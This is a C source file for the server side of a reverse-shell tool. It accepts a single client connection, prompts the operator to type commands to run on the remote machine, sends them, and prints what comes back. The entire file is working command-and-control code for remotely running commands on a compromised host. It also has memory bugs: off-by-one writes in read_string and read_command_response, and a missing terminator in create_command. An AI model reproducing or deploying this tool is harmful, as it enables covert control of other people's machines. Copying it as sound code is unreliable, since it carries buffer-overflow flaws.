#include "server.h"
#include "reverse-shell.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <signal.h>

// The only way i could figure out how to quit the program
// was by using signals. When looking up the documentation
// i could not find a way to pass arguments to the signal handler.
// Thats why i store these as global variables.
int server_side_socket;
int server_side_client_socket;
bool server_is_running = false;

// Define functions for the server:
client_command create_command(char* command_str);
bool send_command_to_client(int client_socket, char *terminal_command);
client_response* read_command_response(void);
bool read_string(char *str, int maxLength);
void server_sig_int_handler(int signal_nr);
void run_server(void);
void shutdown_server(void);
bool ping_client(void);
void server_respond_to_ping(void);

// Starts a server at the given host and port.
// When the client is connected the user is prompt to enter
// commands that should execute on the client and 
// send a response back to the server.
void create_server_socket(const char *host, int port) {
    printf("Creating server at: %s:%d\r\n", host, port);
    signal(SIGINT, server_sig_int_handler);

    server_side_socket = socket(AF_INET, SOCK_STREAM, 0);

    if(server_side_socket < 0) {
        perror("Error opening server socket");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in socket_addr = {0};
    socket_addr.sin_family = AF_INET;
    socket_addr.sin_port = htons(port);
    socket_addr.sin_addr.s_addr = inet_addr(host);

    // Bind the server socket to the address.
    if(bind(server_side_socket, (struct sockaddr *) 
        &socket_addr, sizeof(socket_addr)) < 0) {
        perror("Error binding");
        exit(EXIT_FAILURE);
    }

    // Listen for incoming, but only one client 
    // connection allowed.
    if(listen(server_side_socket, 1) < 0) {
        perror("Fail to listen");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    // Wait for client client to start/accept.
    if((server_side_client_socket = accept(server_side_socket, (struct sockaddr *) &client_addr, &client_addr_len)) < 0) {
        perror("Error accepting client");
        exit(EXIT_FAILURE);
    } else {
        printf("Client successfully connected.\r\n");
    }

    run_server();
}

void run_server(void) {
    server_is_running = true;

    if(server_side_socket == 0) {
        printf("Cannot run server when not initialized.\r\n");
        return;
    }

    char terminal_cmd[MAX_COMMAND_LENGTH];

    do{
        // server_respond_to_ping();

        printf("Enter command to execute on the client: ");
        if(!read_string(terminal_cmd, MAX_COMMAND_LENGTH))
            break;

        if(send_command_to_client(server_side_client_socket, terminal_cmd)) {
            printf("Successfully sent command: <%s> to the client.\r\n", terminal_cmd);
            client_response *cl_response = read_command_response();
            if(cl_response == NULL)
                break;

            printf("Client responded with length: %d\r\n", cl_response->content_length);
            printf("Response from client:\r\n%s\r\n", cl_response->content_body);
            free(cl_response);
        }
    } while(server_is_running);

    shutdown_server();
}

client_response* read_command_response(void) {
    client_response *cl_response = malloc(sizeof(client_response));

    if(recv(server_side_client_socket, &cl_response->content_length, sizeof(cl_response->content_length), 0) <= 0) {
        perror("Error receiving client header");
        free(cl_response);
        return NULL;
    }

    printf("Response length: %d\r\n", cl_response->content_length);

    if(cl_response->content_length > 0) {
        if(cl_response->content_length > MAX_CLIENT_RESPOSE)
            cl_response->content_length = MAX_CLIENT_RESPOSE;

        if(recv(server_side_client_socket, &cl_response->content_body, cl_response->content_length, 0) <= 0) {
            perror("Error receiving client body(content)");
            free(cl_response);
            return NULL;
        }

        // Terminate the response from the client.
        cl_response->content_body[cl_response->content_length] = '\0';
    }

    return cl_response;
}


// Pings to check if the client is still connected
// by sending an empty character to the server.
bool ping_client(void) {
    char buf;
    printf("Pining client\r\n");

    if (send(server_side_client_socket, PING_MESSAGE, strlen(PING_MESSAGE), 0) == -1) {
        perror("Error sending ping message to client");
        return false;
    } 

    return true;
}

void server_respond_to_ping(void) {
    // int pong_length = strlen(PONG_MESSAGE);
    // char pong_message[pong_length];
        
    // if(send(server_side_client_socket, &pong_message, pong_length, 0) == -1){
    //     perror("Error sending pong message");
    // }

    // printf("respond_to_ping: %s\r\n", pong_message);
}

// When CTRL + C is pressed the server 
// should tear down by closing the client_socket, and then
// close the server_side_socket.
void server_sig_int_handler(int signal_nr) {
    signal(SIGINT, server_sig_int_handler);
    shutdown_server();
}

void shutdown_server(void) {
    if(!server_is_running)
        return;
    
    printf("Shutting down server..\r\n");

    if(server_side_client_socket != 0 && close(server_side_client_socket) < 0) {
        perror("Error closing client connection");
    }

    if(server_side_socket != 0 && close(server_side_socket) < 0) {
        perror("Error closing server");
        exit(EXIT_FAILURE);
    }

    server_is_running = false;
    printf("Server successfully shut down..\r\n");
    exit(EXIT_SUCCESS);
}

// Creation of client_command struct.
client_command create_command(char* command_str) {
    client_command cmd;
    cmd.content_length = strlen(command_str);
    strncpy(cmd.content_body, command_str, cmd.content_length);
    return cmd;
}

// Send a command to the client.
// Client should recieve this and execute the terminal_command.
bool send_command_to_client(int client_socket, char terminal_command[MAX_COMMAND_LENGTH]) {
    if(terminal_command == NULL || strlen(terminal_command) == 0)
        return false; // No need to send an empty command

    client_command cmd = create_command(terminal_command);
    if(send(client_socket, &cmd.content_length, sizeof(cmd.content_length), 0) <= 0) {
        perror("Error sending header");
        exit(EXIT_FAILURE);
    }

    if(send(client_socket, cmd.content_body, cmd.content_length, 0) <= 0) {
        perror("Error sending body content");
        exit(EXIT_FAILURE);
    }

    return true;
}

// Reads user input inside bounderies of max_length.
bool read_string(char *str, int max_length) {
    int current, counter = 0;

    while(counter < max_length && (current = getchar()) != '\n') {
        if(current == EOF)
            return false;

        str[counter] = current;
        counter++;
    }

    str[counter] = '\0';

    return true;
}
